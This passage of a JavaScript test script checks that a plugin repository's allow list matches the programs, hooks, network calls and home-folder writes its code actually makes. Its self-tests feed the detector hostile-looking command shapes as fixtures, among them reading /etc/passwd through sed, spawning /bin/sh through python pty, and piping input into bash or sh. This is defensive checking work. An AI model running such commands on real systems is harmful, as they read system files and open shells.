      add(shebang[1], `${path}:1 (the first line)`);
      add(shebang[1].split("/").pop(), `${path}:1 (the first line)`);
      if (shebang[2]) add(shebang[2], `${path}:1 (the first line)`);
    }
  }

  const expected = new Map(DYNAMIC_CALLS.map((d) => [`${d.file} ${d.callee}(${d.arg})`, { ...d, seen: 0 }]));
  for (const path of files.js) {
    const jsText = readOrNull(readFile, path, problems);
    if (jsText === null) continue;
    const { calls, problems: jsProblems } = jsProgramCalls(jsText, WRAPPERS);
    for (const p of jsProblems) problems.push(`${path}:${p.line}: ${p.text}`);
    for (const call of calls) {
      if (call.program) { add(call.program, `${path}:${call.line}`); continue; }
      const key = `${path} ${call.callee}(${call.arg})`;
      const entry = expected.get(key);
      if (!entry) {
        problems.push(`${path}:${call.line}: ${call.callee}(${call.arg}) does not say which program it starts; add it to DYNAMIC_CALLS in scripts/allowlist.test.mjs with what it runs, and to ${ALLOWLIST_DOC}`);
        continue;
      }
      entry.seen++;
      for (const program of entry.programs) add(program, `${path}:${call.line} (${entry.why})`);
    }
  }
  for (const [key, entry] of expected) {
    if (entry.seen !== entry.count) problems.push(`DYNAMIC_CALLS in scripts/allowlist.test.mjs expects ${entry.count} call(s) of ${key}, but the code has ${entry.seen}; check what changed and update both this list and ${ALLOWLIST_DOC}`);
  }
  for (const entry of interpreterTargets) {
    if ((entry.seen ?? 0) !== entry.count) problems.push(`INTERPRETER_TARGETS in scripts/allowlist.test.mjs expects ${entry.count} place(s) where ${entry.file} runs ${entry.command} with ${entry.kind === "inline" ? "a program written into it" : "a file named by an expansion"}, but it has ${entry.seen ?? 0}; read what changed`);
  }
  for (const entry of shellDynamic) {
    if ((entry.seen ?? 0) !== entry.count) problems.push(`SHELL_DYNAMIC in scripts/allowlist.test.mjs expects ${entry.count} command(s) written ${entry.text} in ${entry.file}, but the file has ${entry.seen ?? 0}; check what changed`);
  }
  return { found, problems, policy: DYNAMIC_CALLS.some((d) => d.policy) };
}

// The hook commands each plugin registers. Claude Code passes them to a shell, which runs a script inside the plugin,
// so each one must name a file this test already read.
export function hookCommands(files = scopeFiles(), readFile = read, listHooks = defaultHookFiles) {
  const problems = [];
  const shells = [];
  for (const path of listHooks()) {
    let hooks;
    try { hooks = JSON.parse(readFile(path)); } catch (e) { problems.push(`${path}: ${e.message}`); continue; }
    const commands = Object.values(hooks.hooks ?? {}).flat().flatMap((entry) => (entry.hooks ?? []).map((h) => h.command));
    for (const command of commands) {
      const m = /^"\$\{CLAUDE_PLUGIN_ROOT\}"\/((?:hooks|bin)\/[A-Za-z0-9._-]+)(?: [a-z-]+)*$/.exec(command ?? "");
      if (!m) { problems.push(`${path}: the hook command ${JSON.stringify(command)} is not "\${CLAUDE_PLUGIN_ROOT}"/hooks/<script> or /bin/<script>; read what it starts and update ${ALLOWLIST_DOC}`); continue; }
      const script = `${dirname(dirname(path))}/${m[1]}`;
      // A hook is a shell script or a Node script started by its first line; either way it must be a file this test reads.
      if (!files.shell.includes(script) && !files.js.includes(script)) problems.push(`${path}: the hook command runs ${script}, which this test does not read; add it to the files in scripts/inventory.mjs`);
      shells.push(`${path} (${m[1]})`);
    }
  }
  if (!shells.length) problems.push(`no hook registration was read at all (looked for ${PLUGIN}/<plugin>/hooks/hooks.json); the check would pass while saying nothing`);
  return { shells, problems };
}

function defaultHookFiles() {
  return readdirSync(join(REPO, PLUGIN)).sort().map((plugin) => `${PLUGIN}/${plugin}/hooks/hooks.json`).filter((p) => existsSync(join(REPO, p)));
}

// Compares the programs found in the code with section 1 of the allow list.
export function checkPrograms(found, doc) {
  const violations = [];
  const list = allowlistPrograms(doc);
  if (!list) return ["the allow list has no section that starts with \"## 1. Programs\""];
  for (const [program, where] of found) {
    if (list.programs.has(program)) continue;
    if (program.includes("/") && list.programs.has(program.split("/").pop())) continue;
    violations.push(`the code starts ${program} (${where[0]}${where.length > 1 ? `, and ${where.length - 1} more` : ""}), which section 1 of ${ALLOWLIST_DOC} does not name`);
  }
  const named = new Set(STARTED_BY_OTHERS.map(([p]) => p));
  for (const [program] of list.programs) {
    if (found.has(program) || named.has(program)) continue;
    violations.push(`section 1 of ${ALLOWLIST_DOC} names ${program}, but nothing in the code starts it; remove the row, or add it to STARTED_BY_OTHERS in scripts/allowlist.test.mjs with what does`);
  }
  for (const [program, why] of STARTED_BY_OTHERS) {
    if (!list.programs.has(program)) violations.push(`STARTED_BY_OTHERS in scripts/allowlist.test.mjs says ${program} is started by ${why}, but section 1 of ${ALLOWLIST_DOC} does not name it`);
  }
  return violations;
}

// The preflight check carries the same list of programs in code, so a laptop can be checked against it. The two must
// say the same thing, or one of them is wrong for whoever reads it.
export function checkPreflightTable(doc, programs = PROGRAMS) {
  const violations = [];
  const list = allowlistPrograms(doc);
  if (!list) return ["the allow list has no section that starts with \"## 1. Programs\""];
  for (const p of programs) {
    if (!list.programs.has(p.name)) violations.push(`the PROGRAMS table in runtime/lib/preflight.mjs checks for ${p.name}, which section 1 of ${ALLOWLIST_DOC} does not name`);
  }
  const checked = new Set(programs.map((p) => p.name));
  for (const [program] of list.programs) {
    const name = program.split("/").pop();
    if (checked.has(name)) continue;
    violations.push(`section 1 of ${ALLOWLIST_DOC} names ${program}, which the PROGRAMS table in runtime/lib/preflight.mjs does not check for; a laptop would never be told it is missing`);
  }
  return violations;
}

// ---------- where the code reaches outside a repository ----------

export function checkOutsideReach(files = scopeFiles(), readFile = read, listed = OUTSIDE_A_REPOSITORY) {
  const violations = [];
  const remaining = listed.map(([file, text, what]) => ({ file, text, what, seen: 0 }));
  for (const path of [...files.js, ...files.shell]) {
    readFile(path).split("\n").forEach((line, i) => {
      if (!OUTSIDE_RE.test(line)) return;
      const entry = remaining.find((e) => e.file === path && line.includes(e.text));
      if (entry) { entry.seen++; return; }
      violations.push(`${path}:${i + 1} reaches outside a repository (${line.trim().slice(0, 120)}), which OUTSIDE_A_REPOSITORY in scripts/allowlist.test.mjs does not list; add it with the section 2 location it writes, and update ${ALLOWLIST_DOC}`);
    });
  }
  for (const e of remaining) {
    if (!e.seen) violations.push(`OUTSIDE_A_REPOSITORY in scripts/allowlist.test.mjs lists ${e.file} (${e.what}), but that line is no longer there; check what replaced it`);
  }
  return violations;
}

// ---------- network ----------

export function checkNetwork(files = scopeFiles(), readFile = read, doc = read(ALLOWLIST_DOC), allowed = ALLOWED_NETWORK) {
  const violations = [];
  for (const hit of networkUses(files, readFile, GIT_WRAPPERS)) {
    const entry = allowed.find((a) => a.file === hit.path && hit.text.includes(a.text));
    if (!entry) { violations.push(`${hit.path}:${hit.line} uses ${hit.what} (${hit.text}), which section 4 of ${ALLOWLIST_DOC} says the code does not do; either take it out, or add it to ALLOWED_NETWORK in scripts/allowlist.test.mjs and say so in section 4`); continue; }
    if (!doc.includes(entry.docPhrase)) violations.push(`ALLOWED_NETWORK in scripts/allowlist.test.mjs allows ${entry.text} in ${entry.file}, but ${ALLOWLIST_DOC} does not say "${entry.docPhrase}"`);
  }
  const s4 = section(doc, "## 4. Network") ?? "";
  if (!allowed.length && !/none of its own/.test(s4)) violations.push(`nothing in the code contacts a network, but section 4 of ${ALLOWLIST_DOC} no longer says "none of its own"`);
  return violations;
}

// ---------- writes on the machine ----------

// Every path the scenario left in the home folder, compared with the locations section 2 lists.
export function checkWrites(written, locations) {
  const violations = [];
  const used = new Set();
  for (const path of written) {
    const location = locations.find((l) => locationMatches(l, path));
    if (location) { used.add(location); continue; }
    if (locations.some((l) => l.slice(2).startsWith(`${path}/`))) continue; // a folder on the way to a listed location
    violations.push(`the scenario left ~/${path} in the home folder, which section 2 of ${ALLOWLIST_DOC} does not list`);
  }
  for (const location of locations) {
    if (!used.has(location)) violations.push(`section 2 of ${ALLOWLIST_DOC} lists ${location}, but the scenario wrote nothing there; check whether the code still writes it, and remove the row or add the step that writes it`);
  }
  return violations;
}

const GIT_ENV = { GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1", GIT_AUTHOR_NAME: "Skilliton Test", GIT_AUTHOR_EMAIL: "test@example.invalid", GIT_COMMITTER_NAME: "Skilliton Test", GIT_COMMITTER_EMAIL: "test@example.invalid" };
const MARKET = "acme-skills";

function toolPath(name) {
  const r = spawnSync("sh", ["-c", `command -v ${name}`], { encoding: "utf8" });
  return r.status === 0 ? r.stdout.trim() : null;
}

// Runs the machine-level commands and the hooks under an empty home folder and returns every path they left there,
// relative to it, plus what ran. Returns { notRun } when a program the scenario needs is missing.
// cpSync ends the whole process, past any try, when a tree holds a link that points in a circle: the error comes
// from the C++ filesystem library and never becomes a JavaScript exception (measured on Node 22, macOS). The
// scenario therefore copies the plugins itself, taking files by their bytes and links as links, so that a tree
// someone hands this repository can make the check fail but cannot make it die.
function copyTree(from, to, skipped = []) {
  mkdirSync(to, { recursive: true });
  for (const name of readdirSync(from)) {
    const source = join(from, name), target = join(to, name);
    let st = null;
    try { st = lstatSync(source); } catch (e) { skipped.push(`${source} (${e.code ?? e.message})`); continue; }
    try {
      if (st.isDirectory()) copyTree(source, target, skipped);
      else if (st.isSymbolicLink()) symlinkSync(readlinkSync(source), target);
      else if (st.isFile()) copyFileSync(source, target);
      else skipped.push(`${source} (${"it is not a plain file"})`);
    } catch (e) { skipped.push(`${source} (${e.code ?? e.message})`); }
  }
  return skipped;
}

export function measureWrites() {
  const git = toolPath("git"), keygen = toolPath("ssh-keygen");
  if (!git || !keygen) return { notRun: `${git ? "ssh-keygen" : "git"} was not found on PATH, and the writes check needs it` };
  const base = realpathSync(mkdtempSync(join(tmpdir(), "skilliton-allowlist-")));
  try {
    const ws = {
      home: join(base, "home"), tmp: join(base, "tmp"), tools: join(base, "tools"), keys: join(base, "keys"),
      repo: join(base, "company-skills"), project: join(base, "project"), log: join(base, "clients.log"),
    };
    for (const d of [ws.home, ws.tmp, ws.tools, ws.keys]) mkdirSync(d, { recursive: true });
    for (const [name, target] of Object.entries({ node: process.execPath, git, "ssh-keygen": keygen })) symlinkSync(target, join(ws.tools, name));
    for (const client of ["claude", "codex"]) {
      writeFileSync(join(ws.tools, client), `#!/bin/sh\nexec node ${JSON.stringify(join(REPO, "scripts", "fixtures", "clients", "standin.mjs"))} ${client} "$@"\n`);
      chmodSync(join(ws.tools, client), 0o755);
    }

    // A company skills repository clone, the way join expects to be run from one.
    const skipped = [];
    for (const plugin of readdirSync(join(REPO, PLUGIN))) copyTree(join(REPO, PLUGIN, plugin), join(ws.repo, PLUGIN, plugin), skipped);
    if (skipped.length) return { notRun: `the plugins could not all be copied into the scenario's company repository: ${skipped.slice(0, 3).join(", ")}` };
    mkdirSync(join(ws.repo, "scripts"), { recursive: true });
    for (const f of ["skilliton.mjs", "setup.mjs", "scrub-check.sh"]) copyFileSync(join(REPO, "scripts", f), join(ws.repo, "scripts", f));
    const plugins = readdirSync(join(ws.repo, PLUGIN)).sort();
    writeJson(join(ws.repo, ".claude-plugin", "marketplace.json"), {
      name: MARKET, owner: { name: "acme" },
      plugins: plugins.map((name) => ({ name, source: `./${PLUGIN}/${name}`, description: name, license: "MIT" })),
    });
    writeJson(join(ws.repo, "templates", "project-settings.json"), {
      extraKnownMarketplaces: { [MARKET]: { source: { source: "github", repo: "acme/skills" }, autoUpdate: true } },
      enabledPlugins: Object.fromEntries(plugins.map((name) => [`${name}@${MARKET}`, true])),
    });

    const env = {
      ...GIT_ENV, PATH: `${ws.tools}:${process.env.PATH ?? ""}`, HOME: ws.home, TMPDIR: ws.tmp, LANG: "C.UTF-8",
      SKILLITON_SELF: "skilliton", STANDIN_LOG: ws.log, STANDIN_DEFAULT_HOME: ws.home,
    };
    const run = (file, args, options = {}) => spawnSync(file, args, { encoding: "utf8", env: { ...env, ...options.env }, cwd: options.cwd ?? base, input: options.input, timeout: 120000 });
    const cli = (args, options) => run(process.execPath, [join(ws.repo, "scripts", "skilliton.mjs"), ...args], options);
    const gitIn = (dir, ...args) => execFileSync(git, ["-C", dir, ...args], { env, encoding: "utf8" });

    for (const dir of [ws.repo, ws.project]) {
      mkdirSync(dir, { recursive: true });
      writeFileSync(join(dir, "README.md"), "# a repository\n");
      gitIn(dir, "init", "-q", "-b", "main");
      gitIn(dir, "add", "-A");
      gitIn(dir, "commit", "-q", "-m", "first");
    }
    execFileSync(keygen, ["-q", "-t", "ed25519", "-N", "", "-C", "approver@example.invalid", "-f", join(ws.keys, "approver")], { env });
    const pub = readFileSync(join(ws.keys, "approver.pub"), "utf8").trim().split(/\s+/).slice(0, 2).join(" ");
    writeFileSync(join(ws.keys, "allowed_signers"), `approver@example.invalid namespaces="git" ${pub}\n`);

    const hook = (name, input) => run(join(ws.repo, PLUGIN, "workflow", "bin", "skilliton"), ["hook", name], { cwd: ws.project, input, env: { CLAUDE_PROJECT_DIR: ws.project } });
    const script = (plugin, name, input, extra = {}) => run("bash", [join(ws.repo, PLUGIN, plugin, "hooks", name)], { cwd: ws.project, input, env: { CLAUDE_PROJECT_DIR: ws.project, ...extra } });
    const sessionInput = JSON.stringify({ session_id: "s1", cwd: ws.project, hook_event_name: "SessionStart" });
    // Each step says which exit statuses are expected, so a step that stops working is reported instead of quietly
    // measuring less. 1 is expected where a command reports a state that needs attention (verify has no signed
    // release here, doctor finds things missing in a sandbox).
    const steps = [
      ["join --apply", () => cli(["join", "--company", "acme", "--signers", join(ws.keys, "allowed_signers"), "--marketplace", ws.repo, "--apply"]), [0, 1]],
      ["verify", () => cli(["verify", "--company", "acme"]), [0, 1]],
      ["doctor", () => cli(["doctor", "--dir", ws.project]), [0, 1]],
      ["status line setup --apply", () => run(process.execPath, [join(ws.repo, "scripts", "setup.mjs"), "--apply"])],
      ["the status line", () => run("bash", [join(ws.repo, PLUGIN, "context-hygiene", "hooks", "statusline-quota.sh")], { input: JSON.stringify({ model: { display_name: "test" }, context_window: { used_percentage: 1 }, cost: { total_cost_usd: 0 } }) })],
      ["preflight", () => cli(["preflight", "--no-network", "--repo", ws.repo]), [0, 1]],
      ["prepare --apply", () => cli(["prepare", "--dir", ws.project, "--apply"])],
      ["task start --apply", () => cli(["task", "start", "a task", "--dir", ws.project, "--apply"])],
      ["checkpoint --apply", () => cli(["checkpoint", "--state", "s", "--evidence", "e", "--next", "n", "--dir", ws.project, "--apply"])],
      ["the session-start hook", () => hook("session-start", sessionInput)],
      ["the stop hook", () => hook("stop", JSON.stringify({ session_id: "s1", cwd: ws.project, hook_event_name: "Stop" }))],
      ["the pre-compact hook", () => hook("pre-compact", JSON.stringify({ session_id: "s1", cwd: ws.project, hook_event_name: "PreCompact" }))],
      ["the session-end hook", () => hook("session-end", JSON.stringify({ session_id: "s1", cwd: ws.project, hook_event_name: "SessionEnd" }))],
      ["the handoff hook", () => script("workflow", "session-start-handoff.sh", sessionInput)],
      ["the guardrails session hook", () => script("guardrails", "session-start-guardrails.sh", sessionInput)],
      ["the guardrails command hook", () => script("guardrails", "guard-bash.sh", JSON.stringify({ session_id: "s1", cwd: ws.project, hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command: "git commit -m test" } }))],
      ["the checklist hook", () => script("context-hygiene", "session-start-checklist.sh", sessionInput, { SKILLITON_LESSONS: join(ws.project, "README.md") })],
      ["the read guard hook (a refusal, which writes its log)", () => { writeFileSync(join(ws.project, "large.txt"), "x".repeat(60 * 1024)); return run(process.execPath, [join(ws.repo, PLUGIN, "context-hygiene", "hooks", "read-guard.mjs")], { cwd: ws.project, input: JSON.stringify({ session_id: "s1", cwd: ws.project, hook_event_name: "PreToolUse", tool_name: "Read", tool_input: { file_path: join(ws.project, "large.txt") } }) }); }],
      ["gate --cmd", () => cli(["gate", "--dir", ws.project, "--cmd", "true"])],
      ["status", () => cli(["status", "--dir", ws.project]), [0, 1]],
      ["record a decision --apply", () => cli(["record", "decision", "a choice", "--dir", ws.project, "--apply"])],
      ["index --apply", () => cli(["index", "--dir", ws.project, "--apply"])],
      ["harness --apply", () => cli(["harness", "--dir", ws.project, "--apply"])],
      ["migrate", () => cli(["migrate", "--dir", ws.project]), [0, 1]],
      ["security status", () => cli(["security", "status", "--dir", ws.project]), [0, 1]],
      ["trust show", () => cli(["trust", "show"]), [0, 1]],
      ["task list", () => cli(["task", "list", "--dir", ws.project]), [0, 1]],
      ["remove (preview)", () => cli(["remove", "--dir", ws.project]), [0, 1]],
      ["the status line setup --undo", () => run(process.execPath, [join(ws.repo, "scripts", "setup.mjs"), "--undo"])],
      ["join --undo --apply", () => cli(["join", "--undo", "--company", "acme", "--apply"])],
    ];
    // Snapshots are taken after every step and added up, because a later step (join --undo) removes what an earlier
    // one wrote, and this check is about every place the machine was written, not what is left at the end.
    const ran = [];
    const written = new Set();
    for (const [label, step, expected = [0]] of steps) {
      const r = step();
      if (r.error) return { notRun: `the step "${label}" could not run: ${r.error.message}` };
      ran.push({ label, exit: r.status, expected, output: `${r.stdout ?? ""}${r.stderr ?? ""}`.trim() });
      for (const path of walkRelative(ws.home)) written.add(path);
    }
    return { written: [...written].sort(), leftInTemp: walkRelative(ws.tmp), steps: ran };
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
}

function writeJson(path, value) {
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, `${JSON.stringify(value, null, 2)}\n`);
}

// Every file and folder under dir, as paths relative to it with forward slashes.
// lstat, never stat: a link pointing nowhere or in a circle is a path that was written, and asking what it points at
// would end the whole run with a stack trace instead of a report. A link to a folder is listed and not followed.
function walkRelative(dir, out = [], root = dir) {
  let names;
  try { names = readdirSync(dir).sort(); }
  catch { return out; } // a folder this user may not list was still written, and its own path is already recorded
  for (const name of names) {
    const path = join(dir, name);
    out.push(relative(root, path).split("\\").join("/"));
    let st = null;
    try { st = lstatSync(path); } catch { continue; }
    if (st.isDirectory()) walkRelative(path, out, root);
  }
  return out;
}

// ---------- running ----------

function main() {
  const doc = read(ALLOWLIST_DOC);
  const files = scopeFiles();
  let failed = 0;
  let notRun = 0;
  const report = (name, violations) => {
    for (const v of violations) console.log(`FAIL ${name}: ${v}`);
    console.log(violations.length ? `${name}: ${violations.length} problem(s)` : `ok   ${name}`);
    if (violations.length) failed += violations.length;
  };

  const { found, problems } = programsFromCode(files);
  const hooks = hookCommands(files);
  report(`every file under the plugins is code this test reads, or data (${files.js.length} JavaScript, ${files.shell.length} script(s), ${(files.data ?? []).length} data)`, checkEveryFileIsRead(files));
  report("programs the code starts are read", [...problems, ...hooks.problems]);
  if (problems.length || unreadable.size || (files.notRegular ?? []).length) { console.log("NOT RUN section 1 names every program the code starts: the code could not be read in full (above), so the comparison would have been made against an incomplete list"); notRun++; }
  else report("section 1 names every program the code starts", checkPrograms(found, doc));
  report("the preflight check looks for every program section 1 names", checkPreflightTable(doc));
  report("section 2 covers every place the code reaches outside a repository", checkOutsideReach(files));
  report("section 4 matches the code's network use", checkNetwork(files, read, doc));

  report("every file under the plugins could be read", checkUnreadable(unreadable, files.notRegular ?? [])); // after the checks above, which fill the list
  const locations = allowlistMachineLocations(doc);
  if (!locations?.length) report("section 2 lists locations on the machine", ["section 2 of the allow list has no table of locations in the home folder"]);
  else {
    // A filesystem that refuses something (a link in a circle, a name this system will not copy) must end as NOT RUN
    // with its reason, not as a stack trace half way through a report.
    let measured;
    try { measured = measureWrites(); }
    catch (e) { measured = { notRun: `the scenario could not be run (${e.code ?? e.message})` }; }
    if (measured.notRun) { console.log(`NOT RUN writes in an empty home folder: ${measured.notRun}`); notRun++; }
    else {
      const failedSteps = measured.steps.filter((s) => !s.expected.includes(s.exit));
      for (const s of failedSteps) console.log(`     the step "${s.label}" exited ${s.exit}: ${s.output.split("\n").slice(-2).join(" ").slice(0, 200)}`);
      const leftovers = measured.leftInTemp.length ? [`the scenario left ${measured.leftInTemp.length} path(s) in the temporary folder (${measured.leftInTemp.slice(0, 3).join(", ")}); every temporary file is meant to be removed`] : [];
      const stepProblems = failedSteps.map((s) => `the step "${s.label}" exited ${s.exit} (expected ${s.expected.join(" or ")}), so what it would have written was not measured`);
      report(`writes in an empty home folder (${measured.steps.length} steps, ${measured.written.length} paths)`, [...stepProblems, ...checkWrites(measured.written, locations), ...leftovers]);
    }
  }

  console.log(failed ? `\nallow list check FAILED: ${failed} problem(s); ${ALLOWLIST_DOC} and the code disagree` : notRun ? `\nallow list check: every check that ran passed, ${notRun} NOT RUN` : `\nallow list check passed: ${ALLOWLIST_DOC} matches the code (${files.js.length} JavaScript file(s), ${files.shell.length} script(s))`);
  return failed ? 1 : notRun ? 2 : 0;
}

function selfTest() {
  const doc = read(ALLOWLIST_DOC);
  const fake = (entries) => ({ files: { js: Object.keys(entries).filter((p) => p.endsWith(".mjs")), shell: Object.keys(entries).filter((p) => !p.endsWith(".mjs")) }, readFile: (p) => entries[p] });
  const cases = [
    ["a file that cannot be read is reported rather than stopping the run", () => {
      const dir = mkdtempSync(join(tmpdir(), "allowlist-selftest-"));
      try {
        symlinkSync(join(dir, "nowhere.mjs"), join(dir, "gone.mjs"));
        const seen = new Map();
        const reader = makeReader(dir, seen);
        const text = reader("gone.mjs");
        return text === "" && seen.get("gone.mjs") === "ENOENT"
          && checkOutsideReach({ js: ["gone.mjs"], shell: [] }, reader, []).length === 0 // the checks still run over it
          && checkUnreadable(seen).some((v) => v.includes("could not be read (ENOENT)"));
      } finally { rmSync(dir, { recursive: true, force: true }); }
    }],
    ["a link to a pipe is reported and never read", () => {
      if (process.platform === "win32") return true;
      const dir = mkdtempSync(join(tmpdir(), "allowlist-selftest-"));
      try {
        const hooks = join(dir, PLUGIN, "workflow", "hooks");
        mkdirSync(hooks, { recursive: true });
        writeFileSync(join(hooks, "real.sh"), "#!/bin/sh\ntrue\n");
        execFileSync("mkfifo", [join(dir, "a-pipe")]);
        symlinkSync(join(dir, "a-pipe"), join(hooks, "pipe.sh"));
        const files = scopeFiles(dir);
        const skipped = files.notRegular ?? [];
        return skipped.some((n) => n.path.endsWith("pipe.sh") && n.why.includes("pipe"))
          && !files.shell.some((f) => f.endsWith("pipe.sh")) // never handed to a reader
          && checkUnreadable(new Map(), skipped).some((v) => v.includes("was not read because"));
      } finally { rmSync(dir, { recursive: true, force: true }); }
    }],
    ["the writes scenario lists a link that points nowhere instead of stopping on it", () => {
      const dir = mkdtempSync(join(tmpdir(), "allowlist-selftest-"));
      try {
        mkdirSync(join(dir, "inner"), { recursive: true });
        writeFileSync(join(dir, "inner", "a.txt"), "x\n");
        symlinkSync(join(dir, "nowhere"), join(dir, "dangling"));
        symlinkSync("loop-b", join(dir, "loop-a"));
        symlinkSync("loop-a", join(dir, "loop-b"));
        const listed = walkRelative(dir);
        return listed.includes("dangling") && listed.includes("loop-a") && listed.includes("inner/a.txt");
      } finally { rmSync(dir, { recursive: true, force: true }); }
    }],
    ["a file that reads fine is not reported", () => {
      const dir = mkdtempSync(join(tmpdir(), "allowlist-selftest-"));
      try {
        writeFileSync(join(dir, "a.mjs"), "const x = 1;\n");
        const seen = new Map();
        return makeReader(dir, seen)("a.mjs") === "const x = 1;\n" && checkUnreadable(seen).length === 0;
      } finally { rmSync(dir, { recursive: true, force: true }); }
    }],
    ["a program a hook starts but the list does not name fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": "#!/usr/bin/env bash\ncurl https://example.invalid\n" });
      return checkPrograms(programsFromCode(files, readFile).found, doc).some((v) => v.includes("curl"));
    }],
    ["a program the runtime starts but the list does not name fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'import { spawnSync } from "node:child_process";\nspawnSync("nmap", ["-p", "80"]);\n' });
      return checkPrograms(programsFromCode(files, readFile).found, doc).some((v) => v.includes("nmap"));
    }],
    ["a program the list names that nothing starts fails", () => checkPrograms(new Map(), doc).some((v) => v.includes("names node"))],
    ["a call that does not say what it starts fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'import { spawnSync } from "node:child_process";\nspawnSync(tool, ["--version"]);\n' });
      return programsFromCode(files, readFile).problems.some((p) => p.includes("does not say which program"));
    }],
    ["child_process reached another way fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'const cp = require("child_process");\ncp.execSync("ls");\n' });
      return programsFromCode(files, readFile).problems.some((p) => p.includes("other than through a named import"));
    }],
    ["a program the preflight check does not look for fails", () => checkPreflightTable(doc, []).some((v) => v.includes("would never be told it is missing"))],
    ["a preflight program the list does not name fails", () => checkPreflightTable("## 1. Programs\n\n| Program | Started by |\n|---|---|\n| `node` | the runtime |\n", [{ name: "nmap" }]).some((v) => v.includes("nmap"))],
    ["a shell command through an expansion that nobody explained fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": 'tool=$1\n"$tool" --version\n' });
      return programsFromCode(files, readFile, []).problems.some((p) => p.includes("is an expansion"));
    }],
    ["an interpreter handed a process substitution fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": "bash <(cat payload)\n" });
      return programsFromCode(files, readFile, [], []).problems.some((p) => p.includes("a file named by an expansion"));
    }],
    ["a program handed to an interpreter in a here-document fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": "node <<'EOF'\nconsole.log(1)\nEOF\n" });
      return programsFromCode(files, readFile, [], []).problems.some((p) => p.includes("a program in a here-document"));
    }],
    ["a here-document program that starts a command of its own fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": "node <<'EOF'\nrequire('child_process').execSync('id')\nEOF\n" });
      return programsFromCode(files, readFile, [], [{ file: "hooks/x.sh", command: "node", kind: "here-document", count: 1, target: null, why: "a test" }]).problems.some((p) => p.includes("starts a command of its own"));
    }],
    ["an interpreter with no program of its own fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": "cat program.js | node\n" });
      return programsFromCode(files, readFile, [], []).problems.some((p) => p.includes("no file or program of its own"));
    }],
    ["a command written as one string for env -S fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": 'env -S "node -e console.log(1)"\n' });
      return programsFromCode(files, readFile, [], []).problems.some((p) => p.includes("env -S"));
    }],
    ["a sed program that runs a command fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": "sed -n 's/^x/curl https:\\/\\/example.invalid/e' file\n" });
      return programsFromCode(files, readFile, [], []).problems.some((p) => p.includes("can run a command"));
    }],
    ["a sed e command fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": "sed '1e cat /etc/passwd' file\n" });
      return programsFromCode(files, readFile, [], []).problems.some((p) => p.includes("can run a command"));
    }],
    ["an ordinary sed program passes", () => {
      const { files, readFile } = fake({ "hooks/x.sh": "sed -n 's/^name: //p' file\nsed -e 's/a/b/g' -e '/^#/d' file\n" });
      return programsFromCode(files, readFile, [], []).problems.every((p) => !p.includes("can run a command"));
    }],
    ["every way an inline program starts a command of its own is caught", () => {
      const shapes = [
        ["perl", "my $out = `id`;"],
        ["perl", "my $out = qx{id};"],
        ["perl", 'open(my $fh, "-|", "id");'],
        ["perl", 'exec("id");'],
        ["python3", 'import os; os.execv("/bin/sh", ["sh", "-c", "id"])'],
        ["python3", "import pty; pty.spawn(\"/bin/sh\")"],
        ["python3", 'import os; os.popen("id")'],
        ["ruby", "out = `id`"],
        ["ruby", 'IO.popen("id")'],
        ["osascript", 'do shell script "id"'],
        ["node", 'require("child_process").execSync("id")'],
      ];
      const missed = [];
      for (const [command, program] of shapes) {
        // In single quotes, the way such a program is really written: in double quotes the shell would read the
        // backticks and the $ itself, and the reader would refuse the line for that reason instead.
        const { files, readFile } = fake({ "hooks/x.sh": `${command} -e '${program.replace(/'/g, "'\\''")}'\n` });
        const targets = [{ file: "hooks/x.sh", command, kind: "inline", count: 1, target: null, why: "a test" }];
        const found = programsFromCode(files, readFile, [], targets).problems.some((p) => p.includes("starts a command of its own"));
        if (!found) missed.push(`${command}: ${program}`);
      }
      if (missed.length) console.log(`     not caught: ${missed.join(" | ")}`);
      return missed.length === 0;
    }],
    ["an interpreter told to read its own input is reported", () => {
      const missed = [];
      for (const line of ["printf %s \"$X\" | bash -s", "cat x | sh -", "cat x | python3 -", "cat x | bash -si", "cat x | awk -f-",
        // With an argument after it: that argument is the program's own, so a file name there proves nothing.
        "bash -s hooks/x.sh < \"$X\"", "awk -f - data.txt", "bash -h"]) {
        const { files, readFile } = fake({ "hooks/x.sh": `${line}\n` });
        const said = programsFromCode(files, readFile, [], []).problems;
        if (!said.some((p) => p.includes("takes its program from its input") || p.includes("no file or program of its own"))) missed.push(line);
      }
      if (missed.length) console.log(`     not caught: ${missed.join(" | ")}`);
      return missed.length === 0;
    }],
    ["a command answering about itself is left alone", () => {
      const { files, readFile } = fake({ "hooks/x.sh": "node --version\nbash --help\npython3 -V\nnode -v\n" });
      return programsFromCode(files, readFile, [], []).problems.every((p) => !p.includes("no file or program of its own"));
    }],
    ["an ordinary line that only looks like one is left alone", () => {
      // A program in a file with its data on the input, and a script with its own -s flag.
      const { files, readFile } = fake({ "hooks/x.sh": "awk -f hooks/fields.awk -\nbash hooks/other.sh -s\n", "hooks/fields.awk": "{ print $1 }\n", "hooks/other.sh": "#!/bin/sh\ntrue\n" });
      return programsFromCode(files, readFile, [], []).problems.every((p) => !p.includes("takes its program from its input"));
    }],
    ["an awk program that pipes into a command is reported", () => {
      const missed = [];
      for (const program of ['{ print $0 | "sh" }', '$0 ~ /"/ { print $0 | "sh" }', '{ printf "%s", $1 | "cat" }', '{ print $0 | ENVIRON["CMD"] }']) {
        const { files, readFile } = fake({ "hooks/x.sh": `awk -e '${program.replace(/'/g, "'\\''")}'\n` });
        const targets = [{ file: "hooks/x.sh", command: "awk", kind: "inline", count: 1, target: null, why: "a test" }];
        if (!programsFromCode(files, readFile, [], targets).problems.some((p) => p.includes("starts a command of its own"))) missed.push(program);
      }
      if (missed.length) console.log(`     not caught: ${missed.join(" | ")}`);
      return missed.length === 0;
    }],
    ["a shell told to read its program from its input past an option with a value is reported", () => {
